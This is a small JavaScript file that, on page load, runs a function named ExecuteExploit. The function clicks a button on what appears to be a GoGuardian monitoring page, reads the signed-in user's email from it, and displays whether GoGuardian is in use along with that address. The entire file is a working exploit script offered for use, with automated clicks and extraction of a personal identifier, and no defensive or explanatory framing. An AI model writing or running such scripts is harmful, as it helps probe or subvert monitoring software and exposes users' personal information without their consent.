import ProgressBar from '@badrap/bar-of-progress';

const statusText = document.querySelector('.status-text');
const progress = new ProgressBar();

async function ExecuteExploit() {
    return new Promise((res) => {
        setTimeout(() => {
            const button = document.querySelector('button');
            if (!button) return res('You are not using GoGuardian.');

            if (document.body.querySelector('strong'))
                return res(`You are using GoGuardian, and your email is ${document.body.querySelector('strong').innerText}.`);

            button.click();
            setTimeout(() => {
                button.click();
                res(`You are using GoGuardian, and your email is ${document.body.querySelector('strong').innerText}.`);
            }, 50);
        }, 1000);
    });
}

window.addEventListener('load', async () => {
    progress.start();

    const status = await ExecuteExploit();
    statusText.innerText = status;

    progress.finish();
});
